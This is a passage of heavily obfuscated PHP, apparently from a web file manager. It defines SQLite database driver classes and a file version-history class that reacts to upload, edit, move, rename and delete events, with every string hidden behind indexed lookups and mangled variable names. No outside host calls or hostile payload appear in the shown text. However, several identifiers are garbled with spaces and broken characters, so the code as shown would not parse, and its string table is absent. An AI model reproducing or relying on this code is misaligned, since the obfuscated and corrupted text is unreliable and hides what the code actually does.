think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$áãçÏë”], 30000); if (1 != think_config($Àõ¡Ú[22])) { unset($this->config); } } return $this->linkID[$áãçÏë”]; } public function free() { $this->queryID = null; } public function query($úÀ©şü«) { $ğÑó¼±Õ =& $_SERVER[ä¿÷‹µ±]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $úÀ©şü«; if ($this->queryID) { $this->free(); } think_action_status($ğÑó¼±Õ[23], 1); think_status($ğÑó¼±Õ[24]); $this->queryID = sqlite_query($this->_linkID, $úÀ©şü«); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $À¢ãíÀ– = $this->getAll(); return $À¢ãíÀ–; } } public function execute($·×ÂåùÅ) { $Âãèˆö =& $_SERVER[ä¿÷‹µ±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $·×ÂåùÅ; if ($this->queryID) { $this->free(); } think_action_status($Âãèˆö[25], 1); think_status($Âãèˆö[24]); $ø ‰’ÏÈ = sqlite_exec($this->_linkID, $·×ÂåùÅ); $this->debug(); if (!1 === $ø ‰’ÏÈ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ä¿÷‹µ±][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÀÓ–áñ¸ = sqlite_query($this->_linkID, $_SERVER[ä¿÷‹µ±][27]); if (!$ÀÓ–áñ¸) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¦çÕ§© = sqlite_query($this->_linkID, $_SERVER[ä¿÷‹µ±][28]); if (!$¦çÕ§©) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ÌìƒÍ˜ = array(); if ($this->numRows > 0) { for ($Ü–›äÄİ = 0; $Ü–›äÄİ < $this->numRows; $Ü–›äÄİ++) { $ÌìƒÍ˜[$Ü–›äÄİ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ÌìƒÍ˜; } public function getFields($üÌ‹®à«) { $•¿•Åş‰ =& $_SERVER[ä¿÷‹µ±]; $ÕË©ÂÇ = $this->query($•¿•Åş‰[29] . $üÌ‹®à« . $•¿•Åş‰[30]); $‘œ¼¢šê = array(); if ($ÕË©ÂÇ) { foreach ($ÕË©ÂÇ as $‰áÔÇí÷ => $şæûˆç·) { $‘œ¼¢šê[$şæûˆç·[$•¿•Åş‰[31]]] = array($•¿•Åş‰[32] => $şæûˆç·[$•¿•Åş‰[31]], $•¿•Åş‰[33] => $şæûˆç·[$•¿•Åş‰[34]], $•¿•Åş‰[35] => (bool) ($şæûˆç·[$•¿•Åş‰[36]] === $•¿•Åş‰[12]), $•¿•Åş‰[37] => $şæûˆç·[$•¿•Åş‰[38]], $•¿•Åş‰[39] => strtolower($şæûˆç·[$•¿•Åş‰[40]]) == $•¿•Åş‰[41], $•¿•Åş‰[42] => strtolower($şæûˆç·[$•¿•Åş‰[43]]) == $•¿•Åş‰[44]); } } return $‘œ¼¢šê; } public function getTables($Ôé×­¾ = '') { $îßåûÃÚ =& $_SERVER[ä¿÷‹µ±]; $À¹Şş•‘ = $this->query($îßåûÃÚ[45] . $îßåûÃÚ[46] . $îßåûÃÚ[47]); $ß©±–ò­ = array(); foreach ($À¹Şş•‘ as $ÊÑèÖ…µ => $›Èòù½) { $ß©±–ò­[$ÊÑèÖ…µ] = current($›Èòù½); } return $ß©±–ò­; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $†ØÓ¸Š£ =& $_SERVER[ä¿÷‹µ±]; $¬æ Æ’ = sqlite_last_error($this->_linkID); $this->error = $¬æ Æ’ . $†ØÓ¸Š£[4] . sqlite_error_string($¬æ Æ’); if ($†ØÓ¸Š£[12] != $this->queryStr) { $this->error .= LNG($†ØÓ¸Š£[48]) . $this->queryStr; } think_trace($this->error, $†ØÓ¸Š£[12], $†ØÓ¸Š£[49]); return $this->error; } public function escapeString($·³½–ı—) { return sqlite_escape_string($·³½–ı—); } public function parseLimit($‰¼Ìç¾Å) { $ôû¦Æ¨Ş =& $_SERVER[ä¿÷‹µ±]; $¸¥‰’‰ = $ôû¦Æ¨Ş[12]; if (!empty($‰¼Ìç¾Å)) { $‰¼Ìç¾Å = explode($ôû¦Æ¨Ş[50], $‰¼Ìç¾Å); if (count($‰¼Ìç¾Å) > 1) { $¸¥‰’‰ .= $ôû¦Æ¨Ş[51] . $‰¼Ìç¾Å[1] . $ôû¦Æ¨Ş[52] . $‰¼Ìç¾Å[0] . $ôû¦Æ¨Ş[53]; } else { $¸¥‰’‰ .= $ôû¦Æ¨Ş[51] . $‰¼Ìç¾Å[0] . $ôû¦Æ¨Ş[53]; } } return $¸¥‰’‰; } } class DbSqlite3Base extends Db { public function __construct($â©¡”‹³ = '') { $£¤¤ùå‘ =& $_SERVER[ä¿÷‹µ±]; if (!class_exists($£¤¤ùå‘[54])) { think_exception(think_lang($£¤¤ùå‘[14]) . $£¤¤ùå‘[55]); } if (!empty($â©¡”‹³)) { if (!isset($â©¡”‹³[$£¤¤ùå‘[16]])) { $â©¡”‹³[$£¤¤ùå‘[16]] = 438; } $this->config = $â©¡”‹³; if (empty($this->config[$£¤¤ùå‘[17]])) { $this->config[$£¤¤ùå‘[17]] = array(); } } } public function connect($—¶–ŞĞ = '', $ƒ˜üâÚ = 0) { $îÒ°·ŸÙ =& $_SERVER[ä¿÷‹µ±]; if (!isset($this->linkID[$ƒ˜üâÚ])) { if (empty($—¶–ŞĞ)) { $—¶–ŞĞ = $this->config; } $this->linkID[$ƒ˜üâÚ] = new SQLite3($—¶–ŞĞ[$îÒ°·ŸÙ[21]]); if (!$this->linkID[$ƒ˜üâÚ]) { think_exception($this->linkID[$ƒ˜üâÚ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ƒ˜üâÚ]->busyTimeout(30000); if (1 != think_config($îÒ°·ŸÙ[22])) { unset($this->config); } } return $this->linkID[$ƒ˜üâÚ]; } public function free() { $this->queryID = null; } public function query($•Ğ™çà„) { $»–ëËĞÂ =& $_SERVER[ä¿÷‹µ±]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $•Ğ™çà„; if ($this->queryID) { $this->free(); } think_action_status($»–ëËĞÂ[23], 1); think_status($»–ëËĞÂ[24]); $this->queryID = $this->_linkID->query($•Ğ™çà„); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Õª “¶ = $this->getAll(); $this->numRows = count($Õª “¶); return $Õª “¶; } } public function execute($çÓ£·‡ë) { $§ªùÈ™Õ =& $_SERVER[ä¿÷‹µ±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $çÓ£·‡ë; if ($this->queryID) { $this->free(); } think_action_status($§ªùÈ™Õ[25], 1); think_status($§ªùÈ™Õ[24]); $Ô¼…È ‡ = $this->_linkID->exec($çÓ£·‡ë); $this->debug(); if (!1 === $Ô¼…È ‡) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ä¿÷‹µ±][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $è ãÌöÜ = $this->_linkID->query($_SERVER[ä¿÷‹µ±][27]); if (!$è ãÌöÜ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ì®½ß’Š = $this->_linkID->query($_SERVER[ä¿÷‹µ±][28]); if (!$ì®½ß’Š) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $í¬Ìé = array(); while ($Î¿ÄÇ¦ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $í¬Ìé[] = $Î¿ÄÇ¦; } $this->queryID->reset(); return $í¬Ìé; } public function getFields($ş¶íêª) { $ÊÀ¸‚„­ =& $_SERVER[ä¿÷‹µ±]; $é±²Ú  = $this->query($ÊÀ¸‚„­[29] . $ş¶íêª . $ÊÀ¸‚„­[30]); $¸Ø¼‘’É = array(); if ($é±²Ú ) { foreach ($é±²Ú  as $Í¤äµĞ => $Ì°’›Ø) { $¸Ø¼‘’É[$Ì°’›Ø[$ÊÀ¸‚„­[32]]] = array($ÊÀ¸‚„­[32] => $Ì°’›Ø[$ÊÀ¸‚„­[32]], $ÊÀ¸‚„­[33] => $Ì°’›Ø[$ÊÀ¸‚„­[33]], $ÊÀ¸‚„­[35] => (bool) ($Ì°’›Ø[$ÊÀ¸‚„­[35]] === $ÊÀ¸‚„­[12]), $ÊÀ¸‚„­[37] => $Ì°’›Ø[$ÊÀ¸‚„­[56]], $ÊÀ¸‚„­[39] => (bool) $Ì°’›Ø[$ÊÀ¸‚„­[57]], $ÊÀ¸‚„­[42] => (bool) $Ì°’›Ø[$ÊÀ¸‚„­[57]]); } } return $¸Ø¼‘’É; } public function getTables($‘Ëèı¸Ú = '') { $âĞã¿ÌŞ =& $_SERVER[ä¿÷‹µ±]; $Ø¢®÷µß = $this->query($âĞã¿ÌŞ[45] . $âĞã¿ÌŞ[46] . $âĞã¿ÌŞ[47]); $¨ÊË€‚  = array(); foreach ($Ø¢®÷µß as $¹¤º·ÒÆ => $„öÉıüâ) { $¨ÊË€‚ [$¹¤º·ÒÆ] = current($„öÉıüâ); } return $¨ÊË€‚ ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ˆÀ©ß±¿ =& $_SERVER[ä¿÷‹µ±]; $this->error = $this->_linkID->lastErrorMsg(); if ($ˆÀ©ß±¿[12] != $this->queryStr) { $this->error .= LNG($ˆÀ©ß±¿[48]) . $this->queryStr; } think_trace($this->error, $ˆÀ©ß±¿[12], $ˆÀ©ß±¿[49]); return $this->error; } public function escapeString($´ä†÷úñ) { $Üô‰çœ =& $_SERVER[ä¿÷‹µ±]; if ($this->_linkID) { return $this->_linkID->escapeString($´ä†÷úñ); } return str_ireplace($Üô‰çœ[58], $Üô‰çœ[59], $´ä†÷úñ); } public function parseLimit($‘é­ÓŸˆ) { $«Ä™ëÂƒ =& $_SERVER[ä¿÷‹µ±]; $‡®æŠİë = $«Ä™ëÂƒ[12]; if (!empty($‘é­ÓŸˆ)) { $‘é­ÓŸˆ = explode($«Ä™ëÂƒ[50], $‘é­ÓŸˆ); if (count($‘é­ÓŸˆ) > 1) { $‡®æŠİë .= $«Ä™ëÂƒ[51] . $‘é­ÓŸˆ[1] . $«Ä™ëÂƒ[52] . $‘é­ÓŸˆ[0] . $«Ä™ëÂƒ[53]; } else { $‡®æŠİë .= $«Ä™ëÂƒ[51] . $‘é­ÓŸˆ[0] . $«Ä™ëÂƒ[53]; } } return $‡®æŠİë; } } goto bš‚î†àºÆ; dãïÔß„Ñœ: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $€ï©¼Çğ =& $_SERVER[ä¿÷‹µ±]; $…ŠÏä‹… = $GLOBALS[$€ï©¼Çğ[6]][$€ï©¼Çğ[89]]; if ($…ŠÏä‹…[$€ï©¼Çğ[1230]] != 1) { return; } if ($…ŠÏä‹…[$€ï©¼Çğ[1231]] <= 0) { return; } if (isset($_REQUEST[$€ï©¼Çğ[1232]]) && $_REQUEST[$€ï©¼Çğ[1232]] == $€ï©¼Çğ[88]) { return; } Hook::bind($€ï©¼Çğ[1233], $€ï©¼Çğ[1234]); Hook::bind($€ï©¼Çğ[1235], $€ï©¼Çğ[1236]); Hook::bind($€ï©¼Çğ[1237], $€ï©¼Çğ[1238]); Hook::bind($€ï©¼Çğ[1239], $€ï©¼Çğ[1240]); Hook::bind($€ï©¼Çğ[1241], $€ï©¼Çğ[1242]); Hook::bind($€ï©¼Çğ[1243], $€ï©¼Çğ[1244]); } public static function eventBeforeUpload($ôçº¥) { if ($ôçº¥[3] && $ôçº¥[3] != REPEAT_REPLACE) { return; } $ù¿È‘Ò© = self::parsePath($ôçº¥[0]); if (!$ù¿È‘Ò©) { return; } self::add($ù¿È‘Ò©); } public static function eventBeforeEdit($åÓÃ¾ğ¨) { $™’Í¹À = self::parsePath($åÓÃ¾ğ¨[0]); if (!$™’Í¹À) { return; } self::add($™’Í¹À); } public static function eventBeforeCopyFile($Á±›õ’â, $Ú»ô·å, $…¦¢³ñş, $êµ»¹¥, $™€ÀüÓÂ, $ïş»úÉ) { $ë€¾¢ó¸ =& $_SERVER[ä¿÷‹µ±]; if (isset($…¦¢³ñş->_data[$ë€¾¢ó¸[1177]]) && $…¦¢³ñş->_data[$ë€¾¢ó¸[1177]]) { return; } $ó¼Å‡±Ú = $…¦¢³ñş->getPathOuter($êµ»¹¥); $Ù¢„ÂÏ = self::parsePath($ó¼Å‡±Ú); if (!$Ù¢„ÂÏ) { return; } self::add($Ù¢„ÂÏ); } public static function eventBeforeRename($ª·úùìÊ) { $Ïºìş…ö =& $_SERVER[ä¿÷‹µ±]; $ÏÒŸü‘÷ = self::parsePath($ª·úùìÊ[0]); if (!$ÏÒŸü‘÷) { return; } $»©¤±‘Š = self::checkInHistory($ÏÒŸü‘÷); if (!$»©¤±‘Š) { return; } if ($»©¤±‘Š[$Ïºìş…ö[33]] == $Ïºìş…ö[199]) { $Ç °İ¬‘ = self::listData($ÏÒŸü‘÷); if ($Ç °İ¬‘ && $Ç °İ¬‘[$Ïºìş…ö[369]]) { self::moveHistory($ÏÒŸü‘÷, $ª·úùìÊ[1]); } } else { IO::rename($»©¤±‘Š[$Ïºìş…ö[84]], $ª·úùìÊ[1]); } } public static function eventBeforeMove($¥€­–—£) { $ÒŒˆ—û =& $_SERVER[ä¿÷‹µ±]; $æƒÁœâü = self::parsePath($¥€­–—£[0]); if (!$æƒÁœâü) { return; } $û›•¬ıÆ = self::parsePath($¥€­–—£[1]); if (!$û›•¬ıÆ) { return; } $Çü­šÅİ = $¥€­–—£[3]; $ÙĞöó©¹ = self::checkInHistory($æƒÁœâü); if (!$ÙĞöó©¹) { return; } $ïæŸìÙŠ = self::pathHistory($û›•¬ıÆ); if ($ÙĞöó©¹[$ÒŒˆ—û[33]] == $ÒŒˆ—û[199]) { $ëã”ş÷Ô = self::listData($æƒÁœâü); $ŠÜ«–×— = rtrim($û›•¬ıÆ, $ÒŒˆ—û[8]) . $ÒŒˆ—û[8] . ($Çü­šÅİ ? $Çü­šÅİ : get_path_this($æƒÁœâü)); $Ã¦ûŸ¼› = self::listData($ŠÜ«–×—); if ($ëã”ş÷Ô && $ëã”ş÷Ô[$ÒŒˆ—û[369]] && $Ã¦ûŸ¼› && $Ã¦ûŸ¼›[$ÒŒˆ—û[369]]) { return self::clear($æƒÁœâü); } if ($ëã”ş÷Ô && $ëã”ş÷Ô[$ÒŒˆ—û[369]]) { self::moveHistory($æƒÁœâü, $Çü­šÅİ, $ïæŸìÙŠ); } } else { IO::move($ÙĞöó©¹[$ÒŒˆ—û[84]], $ïæŸìÙŠ, !1, $Çü­šÅİ); self::clearEmptyFolder(IO::pathFather($ÙĞöó©¹[$ÒŒˆ—û[84]])); } } public static function eventAfterRemove($½ßÏíäö, $òòÙÃ) { $º¿¬Ìóœ =& $_SERVER[ä¿÷‹µ±]; if (!$òòÙÃ) { return; } $Šî”Ú = self::parsePath($½ßÏíäö[0]); if (!$Šî”Ú) { return; } $¿È’ìè = self::checkInHistory($Šî”Ú); if (!$¿È’ìè) { return; } if ($¿È’ìè[$º¿¬Ìóœ[33]] == $º¿¬Ìóœ[199]) { $î¤è´®ì = self::listData($Šî”Ú, !1); if ($î¤è´®ì && $î¤è´®ì[$º¿¬Ìóœ[369]]) { self::clear($Šî”Ú, !1); } } else { IO::remove($¿È’ìè[$º¿¬Ìóœ[84]]); self::clearEmptyFolder(IO::pathFather($¿È’ìè[$º¿¬Ìóœ[84]])); } } private static function checkInHistory($ñïĞ­¨Î) { $ü±¢î¬ = self::pathHistory($ñïĞ­¨Î); if (!IO::exist($ü±¢î¬)) { $ü±¢î¬ .= $_SERVER[ä¿÷‹µ±][1245]; } return IO::exist($ü±¢î¬) ? IO::info($ü±¢î¬) : !1; } private static function parsePath($¤ŸÄşîî) { $˜ÅŞŸï’ =& $_SERVER[ä¿÷‹µ±]; if (!$¤ŸÄşîî) { return !1; } if ($GLOBALS[$˜ÅŞŸï’[1246]]) { return; } $Ì¸ËÚ¥£ = KodIO::parse($¤ŸÄşîî); $æñÆÂË¹ = $Ì¸ËÚ¥£[$˜ÅŞŸï’[33]]; $°»»ÕÃò = !$æñÆÂË¹ || $æñÆÂË¹ == KodIO::KOD_IO || $æñÆÂË¹ == KodIO::KOD_SHARE_ITEM; if (!$°»»ÕÃò || !$Ì¸ËÚ¥£[$˜ÅŞŸï’[1247]]) { return !1; } if (substr($¤ŸÄşîî, 0, strlen(DATA_PATH . $˜ÅŞŸï’[1248])) == DATA_PATH . $˜ÅŞŸï’[1248]) { return !1; } if ($æñÆÂË¹ == KodIO::KOD_SHARE_ITEM) { $öÎ‹şÃ« = IO::init($¤ŸÄşîî); if ($öÎ‹şÃ«->pathParse[$˜ÅŞŸï’[1173]]) { return self::parsePath($öÎ‹şÃ«->pathParse[$˜ÅŞŸï’[1173]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ÑŠ‰› ‘ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $˜ÅŞŸï’[1249]); foreach ($ÑŠ‰› ‘ as $ªÎŞ‚€É) { if (!$æñÆÂË¹ && substr($¤ŸÄşîî, 0, strlen($ªÎŞ‚€É)) == $ªÎŞ‚€É) { return !1; } } self::log($GLOBALS[$˜ÅŞŸï’[1168]] . $˜ÅŞŸï’[1250] . $¤ŸÄşîî); return $¤ŸÄşîî; } private static function pathHistory($í‚Š¦¡ğ) { $áÂõò =& $_SERVER[ä¿÷‹µ±]; $ëƒ‰†½ó = self::$_historyBase . ltrim(KodIO::clear($í‚Š¦¡ğ), $áÂõò[8]); $ëƒ‰†½ó = str_replace(array($áÂõò[1251]), array($áÂõò[1252]), $ëƒ‰†½ó); return $ëƒ‰†½ó; } public static function log($”ò¶¹) { } public static function historyCount($ĞüìÃå) { $éìÃèŠ© =& $_SERVER[ä¿÷‹µ±]; $èæˆ¼ğ¡ = array(); $…ÆÏíŞ = array(); foreach ($ĞüìÃå as $ĞÈ„—®ó) { $†®©úŞÄ = get_path_father($ĞÈ„—®ó); if (!$…ÆÏíŞ[$†®©úŞÄ]) { $…ÆÏíŞ[$†®©úŞÄ] = array(); } $…ÆÏíŞ[$†®©úŞÄ][] = get_path_this($ĞÈ„—®ó); } foreach ($…ÆÏíŞ as $†®©úŞÄ => $ùçÈÄ›É) { $¾®¹ÜÚ´ = self::parsePath($†®©úŞÄ); if (!$¾®¹ÜÚ´) { continue; } foreach ($ùçÈÄ›É as $½»¯ËÈÖ) { $±è§‰¶í = self::listData(rtrim($¾®¹ÜÚ´, $éìÃèŠ©[8]) . $éìÃèŠ©[8] . $½»¯ËÈÖ, !1); if ($±è§‰¶í && $±è§‰¶í[$éìÃèŠ©[369]]) { $èæˆ¼ğ¡[rtrim($†®©úŞÄ, $éìÃèŠ©[8]) . $éìÃèŠ©[8] . $½»¯ËÈÖ] = count($±è§‰¶í[$éìÃèŠ©[369]]); } } } return $èæˆ¼ğ¡; } public static function add($Àéô›) { $ï‘¢Ú–ò =& $_SERVER[ä¿÷‹µ±]; $†ØÅá— = self::listData($Àéô›); if (!$†ØÅá—) { return; } $İ¯¦ì = Model($ï‘¢Ú–ò[789])->get($ï‘¢Ú–ò[1253]); $Ä±¡¬ = $GLOBALS[$ï‘¢Ú–ò[6]][$ï‘¢Ú–ò[89]][$ï‘¢Ú–ò[1231]]; $Äº§•Ïè = $İ¯¦ì == $ï‘¢Ú–ò[1254] ? min(5, $Ä±¡¬) : $Ä±¡¬; if ($Ä±¡¬ <= 0) { return; } $Ãİû´¶Ü = IO::info($Àéô›); $€˜¹¯¢Ü = $†ØÅá—[$ï‘¢Ú–ò[369]]; if ($Ãİû´¶Ü[$ï‘¢Ú–ò[76]] == 0) { return; } if ($Ãİû´¶Ü[$ï‘¢Ú–ò[76]] >= 1024 * 1024 * 500) { return !1; } $áº¿èçª = IO::hashSimple($Àéô›); if ($€˜¹¯¢Ü && $€˜¹¯¢Ü[0][$ï‘¢Ú–ò[177]] == $áº¿èçª) { return !0; } if (array_key_exists($ï‘¢Ú–ò[202], $Ãİû´¶Ü) && !$Ãİû´¶Ü[$ï‘¢Ú–ò[202]]) { return !1; } $£Š’­óÜ = short_id(time()); $ıİÖåâ = array($ï‘¢Ú–ò[399] => $£Š’­óÜ, $ï‘¢Ú–ò[177] => $áº¿èçª, $ï‘¢Ú–ò[32] => $Ãİû´¶Ü[$ï‘¢Ú–ò[32]] . $ï‘¢Ú–ò[10] . date($ï‘¢Ú–ò[1255]) . rand_string(1), $ï‘¢Ú–ò[76] => $Ãİû´¶Ü[$ï‘¢Ú–ò[76]], $ï‘¢Ú–ò[454] => USER_ID, $ï‘¢Ú–ò[200] => time(), $ï‘¢Ú–ò[1256] => $ï‘¢Ú–ò[12]); IO::mkdir($†ØÅá—[$ï‘¢Ú–ò[1257]]); $Úî©•öá = IO::copy($Àéô›, $†ØÅá—[$ï‘¢Ú–ò[1257]], !1, $ıİÖåâ[$ï‘¢Ú–ò[32]]); if (!$Úî©•öá) { self::clearEmptyFolder($†ØÅá—[$ï‘¢Ú–ò[1257]]); return !1; } array_unshift($€˜¹¯¢Ü, $ıİÖåâ); if (count($€˜¹¯¢Ü) > $Äº§•Ïè) { $¡á‚ä×ô = array_slice($€˜¹¯¢Ü, $Äº§•Ïè); foreach ($¡á‚ä×ô as $’ì¡ïûÛ) { IO::remove($†ØÅá—[$ï‘¢Ú–ò[1257]] . $’ì¡ïûÛ[$ï‘¢Ú–ò[32]]); } $€˜¹¯¢Ü = array_slice($€˜¹¯¢Ü, 0, $Äº§•Ïè); } return self::saveData($†ØÅá—[$ï‘¢Ú–ò[1258]], $€˜¹¯¢Ü); } public static function remove($Îó´ƒŞ, $ö›Èí¯Á) { $©ŠÑÆß† =& $_SERVER[ä¿÷‹µ±]; $íúƒÃ°¯ = self::listData($Îó´ƒŞ); $§Ùœ×Éë = array(); if (!$íúƒÃ°¯) { return !1; } foreach ($íúƒÃ°¯[$©ŠÑÆß†[369]] as $áò‘÷‡«) { if ($áò‘÷‡«[$©ŠÑÆß†[399]] == $ö›Èí¯Á) { IO::remove($íúƒÃ°¯[$©ŠÑÆß†[1257]] . $áò‘÷‡«[$©ŠÑÆß†[32]]); continue; } $§Ùœ×Éë[] = $áò‘÷‡«; } return self::saveData($íúƒÃ°¯[$©ŠÑÆß†[1258]], $§Ùœ×Éë); } public static function clear($„·Ã­Ÿ, $³é»Ê¨Ê = true) { $¥³šÀ¹Ë =& $_SERVER[ä¿÷‹µ±]; $„õ€ãŠ = self::listData($„·Ã­Ÿ, $³é»Ê¨Ê); if (!$„õ€ãŠ) { return !1; } foreach ($„õ€ãŠ[$¥³šÀ¹Ë[369]] as $şÁŠèÔÁ) { IO::remove($„õ€ãŠ[$¥³šÀ¹Ë[1257]] . $şÁŠèÔÁ[$¥³šÀ¹Ë[32]]); } return self::saveData($„õ€ãŠ[$¥³šÀ¹Ë[1258]], array()); } public static function moveHistory($ç©Ì±Ù, $ÈÀ†¥Íú = '', $›÷äôã„ = '') { $›ì¾ûĞ· =& $_SERVER[ä¿÷‹µ±]; $öâÛíí÷ = self::listData($ç©Ì±Ù, !1); if (!$öâÛíí÷ || !$öâÛíí÷[$›ì¾ûĞ·[369]]) { return !1; } $„ÚÁ˜¬„ = $›ì¾ûĞ·[1245]; $ÈÀ†¥Íú = $ÈÀ†¥Íú ? $ÈÀ†¥Íú : get_path_this($ç©Ì±Ù); $›÷äôã„ = $›÷äôã„ ? $›÷äôã„ : $öâÛíí÷[$›ì¾ûĞ·[1257]]; $–ª÷ÇØ = substr(get_path_this($öâÛíí÷[$›ì¾ûĞ·[1258]]), 0, -strlen($„ÚÁ˜¬„)); foreach ($öâÛíí÷[$›ì¾ûĞ·[369]] as $•‚¸’“Å => $Í‚ªªôó) { $‡ŠÈ§š = $ÈÀ†¥Íú . substr($Í‚ªªôó[$›ì¾ûĞ·[32]], strlen($–ª÷ÇØ)); $ìøí¢¡£ = IO::move($öâÛíí÷[$›ì¾ûĞ·[1257]] . $Í‚ªªôó[$›ì¾ûĞ·[32]], $›÷äôã„, !1, $‡ŠÈ§š); if ($ìøí¢¡£) { $öâÛíí÷[$›ì¾ûĞ·[369]][$•‚¸’“Å][$›ì¾ûĞ·[32]] = $‡ŠÈ§š; } } $öâÛíí÷[$›ì¾ûĞ·[1258]] = IO::move($öâÛíí÷[$›ì¾ûĞ·[1258]], $›÷äôã„, !1, $ÈÀ†¥Íú . $„ÚÁ˜¬„); self::saveData($öâÛíí÷[$›ì¾ûĞ·[1258]], $öâÛíí÷[$›ì¾ûĞ·[369]]); self::clearEmptyFolder($öâÛíí÷[$›ì¾ûĞ·[1257]]); } public static function rollback($™Ñ÷»î, $ÎöĞ±Ì) { $‚¤óó¡… =& $_SERVER[ä¿÷‹µ±]; $úèØÖÃÕ = self::listData($™Ñ÷»î); if (!$úèØÖÃÕ) { return; } $³Ñä–’Ï = IO::info($™Ñ÷»î); foreach ($úèØÖÃÕ[$‚¤óó¡…[369]] as $ÈŠ¯å«ƒ => $ò¡£ä‹ä) { if ($ò¡£ä‹ä[$‚¤óó¡…[399]] == $ÎöĞ±Ì) { self::add($™Ñ÷»î); $®çœçè¼ = $úèØÖÃÕ[$‚¤óó¡…[1257]] . $ò¡£ä‹ä[$‚¤óó¡…[32]]; $öê²ïË¢ = IO::copy($®çœçè¼, IO::pathFather($™Ñ÷»î), REPEAT_REPLACE, $³Ñä–’Ï[$‚¤óó¡…[32]]); if ($öê²ïË¢) { self::remove($™Ñ÷»î, $ÎöĞ±Ì); } return $öê²ïË¢; } } return !1; } public static function setDetail($¸±ÏÜÜ, $ÖÊ¦±µß, $ùš´²»Ì) { $§¯€éèÚ =& $_SERVER[ä¿÷‹µ±]; $œËâ‡¸… = self::listData($¸±ÏÜÜ); if (!$œËâ‡¸…) { return; } foreach ($œËâ‡¸…[$§¯€éèÚ[369]] as $Ú§ËÃØ => $ß·ŠìÏ) { if ($ß·ŠìÏ[$§¯€éèÚ[399]] == $ÖÊ¦±µß) { $œËâ‡¸…[$§¯€éèÚ[369]][$Ú§ËÃØ][$§¯€éèÚ[1256]] = $ùš´²»Ì; self::saveData($œËâ‡¸…[$§¯€éèÚ[1258]], $œËâ‡¸…[$§¯€éèÚ[369]]); return !0; } } return !1; } public static function fileInfo($Š•†¸Ù¹, $²èŞÄß“) { $Åô’Œ¾ò =& $_SERVER[ä¿÷‹µ±]; $¢ê˜äƒç = self::listData($Š•†¸Ù¹); if (!$¢ê˜äƒç) { show_json(LNG($Åô’Œ¾ò[105]), !1); } $‘ü…éıÔ = $Åô’Œ¾ò[12]; foreach ($¢ê˜äƒç[$Åô’Œ¾ò[369]] as $çú™•ƒŸ => $İü éšÌ) { if ($İü éšÌ[$Åô’Œ¾ò[399]] != $²èŞÄß“) { continue; } $‘ü…éıÔ = $¢ê˜äƒç[$Åô’Œ¾ò[1257]] . $İü éšÌ[$Åô’Œ¾ò[32]]; break; } if (!$‘ü…éıÔ) { show_json(LNG($Åô’Œ¾ò[105]), !1); } return IO::info($‘ü…éıÔ); } public static function fileOut($Ø‹şŞúâ, $Ùô†Åõ¯, $­–Ä€©î = false) { $øÌº»ìÃ =& $_SERVER[ä¿÷‹µ±]; $¯„µİİÀ = self::fileInfo($Ø‹şŞúâ, $Ùô†Åõ¯); $ÈŠ´¯¬— =& $GLOBALS[$øÌº»ìÃ[7]]; $­–Ä€©î = isset($ÈŠ´¯¬—[$øÌº»ìÃ[1221]]) && $ÈŠ´¯¬—[$øÌº»ìÃ[1221]] == 1; if (isset($ÈŠ´¯¬—[$øÌº»ìÃ[33]]) && $ÈŠ´¯¬—[$øÌº»ìÃ[33]] == $øÌº»ìÃ[1259]) { return IO::fileOutImage($¯„µİİÀ[$øÌº»ìÃ[84]], $ÈŠ´¯¬—[$øÌº»ìÃ[1260]]); } IO::fileOut($¯„µİİÀ[$øÌº»ìÃ[84]], $­–Ä€©î, get_path_this($Ø‹şŞúâ)); } public static function listData($ÇÔğŠï, $¨™œ€È = true) { $Ø÷àÚµ =& $_SERVER[ä¿÷‹µ±]; if ($¨™œ€È && !IO::exist($ÇÔğŠï)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ÇÔğŠï, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $§¨’ŠŒÏ = self::pathHistory($ÇÔğŠï); $£Ä’ÇªŞ = array($Ø÷àÚµ[1258] => $§¨’ŠŒÏ . $Ø÷àÚµ[1245], $Ø÷àÚµ[1257] => rtrim(get_path_father($§¨’ŠŒÏ), $Ø÷àÚµ[8]) . $Ø÷àÚµ[8], $Ø÷àÚµ[369] => array()); $‘ä·åÁş = IO::getContent($£Ä’ÇªŞ[$Ø÷àÚµ[1258]]); if ($‘ä·åÁş) { $ÕÉºÊÏ÷ = json_decode($‘ä·åÁş, !0); if (is_array($ÕÉºÊÏ÷)) { 